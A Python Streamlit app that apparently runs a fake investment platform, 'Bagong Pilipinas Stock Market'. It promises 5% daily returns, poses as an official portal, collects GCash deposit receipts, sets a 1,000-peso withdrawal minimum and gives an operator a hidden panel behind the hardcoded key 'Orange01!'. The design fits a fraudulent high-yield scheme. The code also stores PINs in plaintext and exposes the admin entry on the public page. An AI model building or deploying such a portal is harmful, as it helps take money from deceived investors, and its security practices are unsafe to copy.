import streamlit as st
import json
import os
from datetime import datetime, timedelta
import time

# --- 1. SESSION INITIALIZER ---
if 'user' not in st.session_state: st.session_state.user = None
if 'page' not in st.session_state: st.session_state.page = "main"
if 'is_boss' not in st.session_state: st.session_state.is_boss = False
if 'confirm_amt' not in st.session_state: st.session_state.confirm_amt = False

# Ensure receipts folder exists
if not os.path.exists("receipts"):
    os.makedirs("receipts")

# --- 2. DATA ENGINE ---
REGISTRY_FILE = "bpsm_registry.json"

def load_registry():
    if os.path.exists(REGISTRY_FILE):
        try:
            with open(REGISTRY_FILE, "r") as f:
                return json.load(f)
        except: return {}
    return {}

def update_user(name, data):
    reg = load_registry()
    reg[name] = data
    with open(REGISTRY_FILE, "w") as f:
        json.dump(reg, f, default=str)

# --- 3. UI STYLING ---
st.set_page_config(page_title="BPSM Official", layout="wide")
st.markdown("""
    <style>
    [data-testid="stSidebar"] { display: none; }
    header { visibility: hidden; }
    .stApp { background-color: #0b0c0e; color: white; }
    .block-container { padding: 0 !important; max-width: 100% !important; }
    .user-box { text-align: center; padding: 30px 10px; background: #111217; border-bottom: 1px solid #2a2b30; }
    .balance-val { color: #0dcf70; font-size: 3.5rem; font-weight: 900; margin: 5px 0; }
    .section-header { background: #1c1e24; padding: 12px 20px; margin-top: 25px; border-left: 5px solid #0dcf70; font-weight: bold; text-transform: uppercase; color: #0dcf70; }
    .ticker-wrap { background: #000; color: #0dcf70; padding: 12px 0; position: fixed; bottom: 0; width: 100%; font-size: 0.85rem; border-top: 1px solid #2a2b30; z-index: 999; overflow: hidden; }
    @keyframes ticker { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
    .ticker-text { display: inline-block; white-space: nowrap; animation: ticker 25s linear infinite; font-weight: bold; }
    .stButton>button { border-radius: 12px !important; height: 3.5rem !important; font-weight: bold !important; width: 100%; }
    </style>
    """, unsafe_allow_html=True)

# --- 4. ACCESS CONTROL ---
if st.session_state.user is None:
    st.markdown("<div style='background: linear-gradient(135deg, #0038a8 0%, #ce1126 100%); padding: 40px 20px; text-align: center;'><h1>BAGONG PILIPINAS<br>STOCK MARKET</h1><p>Automatic 24-Hour Payouts | 5% Daily ROI</p></div>", unsafe_allow_html=True)
    t1, t2 = st.tabs(["🔑 SIGN-IN", "📝 REGISTER"])
    with t1:
        ln = st.text_input("INVESTOR NAME").upper()
        lp = st.text_input("SECURE PIN", type="password", max_chars=6)
        if st.button("VERIFY & ACCESS"):
            reg = load_registry()
            if ln in reg and reg[ln].get('pin') == lp:
                st.session_state.user = ln
                st.rerun()
    with t2:
        rn = st.text_input("FULL LEGAL NAME").upper()
        rp = st.text_input("CREATE 6-DIGIT PIN", type="password", max_chars=6)
        if st.button("CREATE ACCOUNT"):
            if rn and len(rp) == 6:
                update_user(rn, {"pin": rp, "wallet": 0.0, "inv": [], "tx": []})
                st.success("Account Created!")

# --- 5. INVESTOR PORTAL ---
else:
    name = st.session_state.user
    reg = load_registry()
    data = reg[name]
    now = datetime.now()

    # --- AUTO-PAYOUT LOGIC ---
    active_inv = []
    payout_triggered = False
    for i in data.get('inv', []):
        end_time = datetime.fromisoformat(i['end'])
        if now >= end_time: 
            profit_amt = i['amt'] * 0.05
            total_return = i['amt'] + profit_amt
            data['wallet'] += total_return
            data.setdefault('tx', []).append({"date": end_time.strftime("%Y-%m-%d %H:%M"), "type": "PROFIT CREDIT", "amt": total_return, "status": "SUCCESSFUL"})
            payout_triggered = True
        else: active_inv.append(i)
    
    if payout_triggered:
        data['inv'] = active_inv
        update_user(name, data); st.rerun()

    st.markdown("""<div class="ticker-wrap"><div class="ticker-text">🔥 MARKET ALERT: All 24H Liquidation Cycles Completed! | 📈 JOIN BPSM: Earn 5% Daily Interest | 🚀 SECURE: Official Bagong Pilipinas Stock Market Portal.</div></div>""", unsafe_allow_html=True)
    st.markdown(f"<div class='user-box'><p style='color:#8c8f99;'>WITHDRAWABLE BALANCE</p><h1 class='balance-val'>₱{data['wallet']:,.2f}</h1><p style='color:#8c8f99;'>Account: {name}</p></div>", unsafe_allow_html=True)

    # --- PAGE: DEPOSIT ---
    if st.session_state.page == "dep":
        st.markdown("<div class='section-header'>📥 DEPOSIT CAPITAL</div>", unsafe_allow_html=True)
        d_amt = st.number_input("Enter Amount (PHP)", min_value=100.0, step=100.0, disabled=st.session_state.confirm_amt)
        
        if not st.session_state.confirm_amt:
            if st.button("CONFIRM AMOUNT"):
                if d_amt >= 100:
                    st.session_state.confirm_amt = True
                    st.rerun()
        else:
            st.success(f"Amount Confirmed: ₱{d_amt:,.2f}")
            receipt = st.file_uploader("Upload GCash Receipt", type=['jpg', 'png', 'jpeg'])
            
            if st.button("SUBMIT DEPOSIT"):
                if receipt:
                    # Logic to save the actual image file
                    file_path = f"receipts/{name}_{int(time.time())}.jpg"
                    with open(file_path, "wb") as f:
                        f.write(receipt.getbuffer())
                    
                    data.setdefault('tx', []).append({
                        "date": now.strftime("%Y-%m-%d %H:%M"), 
                        "type": "DEPOSIT", 
                        "amt": d_amt, 
                        "status": "SUBMITTED",
                        "receipt_path": file_path # Save path for Admin
                    })
                    update_user(name, data)
                    st.session_state.confirm_amt = False
                    st.session_state.page = "main"
                    st.success("Submitted!"); time.sleep(1); st.rerun()
            
            if st.button("🔄 CHANGE AMOUNT"):
                st.session_state.confirm_amt = False; st.rerun()

        if st.button("⬅️ BACK"): st.session_state.confirm_amt = False; st.session_state.page = "main"; st.rerun()

    # --- PAGE: WITHDRAW ---
    elif st.session_state.page == "wd":
        st.markdown("<div class='section-header'>📤 WITHDRAW FUNDS</div>", unsafe_allow_html=True)
        w_amt = st.number_input("Amount", min_value=1000.0, max_value=data['wallet'], step=100.0)
        w_method = st.selectbox("METHOD", ["GCASH", "BANK TRANSFER", "PAYMAYA"])
        w_info = st.text_input("ACCOUNT NAME & NUMBER")
        
        if st.button("SUBMIT WITHDRAWAL"):
            if w_info:
                data['wallet'] -= w_amt
                data.setdefault('tx', []).append({"date": now.strftime("%Y-%m-%d %H:%M"), "type": f"WITHDRAW ({w_method})", "amt": w_amt, "info": w_info, "status": "SUBMITTED"})
                update_user(name, data)
                st.success("Submitted!"); time.sleep(1); st.session_state.page = "main"; st.rerun()
        if st.button("⬅️ CANCEL"): st.session_state.page = "main"; st.rerun()

    # --- MAIN DASHBOARD ---
    else:
        c1, c2 = st.columns(2)
        with c1:
            if st.button("📥 DEPOSIT"): st.session_state.page = "dep"; st.rerun()
        with c2:
            if data['wallet'] >= 1000:
                if st.button("📤 WITHDRAW"): st.session_state.page = "wd"; st.rerun()
            else: st.button("📤 (Min ₱1k)", disabled=True)

        st.markdown("<div class='section-header'>⏳ ACTIVE 24H CYCLES (5% ROI)</div>", unsafe_allow_html=True)
        if not data.get('inv'): st.write("No active cycles.")
        else:
            for t in data['inv']:
                end_t = datetime.fromisoformat(t['end'])
                rem = end_t - now
                live_int = (t['amt'] * 0.05) * min((now - datetime.fromisoformat(t.get('start', t['end']))).total_seconds() / 86400, 1.0) if t.get('start') else 0.0
                st.markdown(f"<div style='background:#1c1e24; padding:15px; border-radius:15px; border:1px solid #3a3d46; margin-bottom:10px;'><div style='display:flex; justify-content:space-between;'><span>Principal: ₱{t['amt']:,}</span><span style='color:#0dcf70;'>Accrued: +₱{live_int:,.2f}</span></div><div style='color:#0dcf70; font-size:1.8rem; font-weight:bold; text-align:center;'>{str(rem).split('.')[0]}</div></div>", unsafe_allow_html=True)

        st.markdown("<div class='section-header'>📜 TRANSACTION LOGS</div>", unsafe_allow_html=True)
        for t in reversed(data.get('tx', [])):
            st.write(f"**{t['date']}** | {t['type']} | ₱{t['amt']:,} | `{t['status']}`")

    if st.sidebar.button("LOGOUT"): st.session_state.user = None; st.session_state.page = "main"; st.rerun()

# --- 6. BOSS PANEL ---
st.divider()
with st.expander("⚠️"):
    key_in = st.text_input("Admin Key", type="password")
    if st.button("ACCESS MASTER CONTROL"):
        if key_in == "Orange01!": st.session_state.is_boss = True; st.rerun()

if st.session_state.is_boss:
    all_users = load_registry()
    st.markdown("### 👑 MASTER CONTROL")
    for u_name, u_info in all_users.items():
        for idx, tx in enumerate(u_info.get('tx', [])):
            if tx['status'] in ["SUBMITTED", "PENDING"]:
                st.info(f"{tx['type']}: {u_name} | ₱{tx['amt']:,} | {tx['status']}")
                
                # --- SHOW RECEIPT TO ADMIN ---
                if "receipt_path" in tx:
                    if st.button(f"👁️ VIEW RECEIPT - {u_name}_{idx}"):
                        st.image(tx['receipt_path'], caption=f"Deposit Receipt from {u_name}")
                
                if "info" in tx: st.write(f"📍 Send to: {tx['info']}")
                
                ca, cb = st.columns(2)
                with ca:
                    if st.button(f"Mark PENDING - {u_name}_{idx}"):
                        all_users[u_name]['tx'][idx]['status'] = "PENDING"
                        update_user(u_name, all_users[u_name]); st.rerun()
                with cb:
                    if st.button(f"Mark SUCCESSFUL - {u_name}_{idx}"):
                        all_users[u_name]['tx'][idx]['status'] = "SUCCESSFUL"
                        if "DEPOSIT" in tx['type']:
                            st_t = datetime.now()
                            all_users[u_name].setdefault('inv', []).append({"amt": tx['amt'], "start": st_t.isoformat(), "end": (st_t + timedelta(hours=24)).isoformat()})
                        update_user(u_name, all_users[u_name]); st.success("Updated!"); st.rerun()
    if st.button("EXIT ADMIN"): st.session_state.is_boss = False; st.rerun()

time.sleep(1); st.rerun()
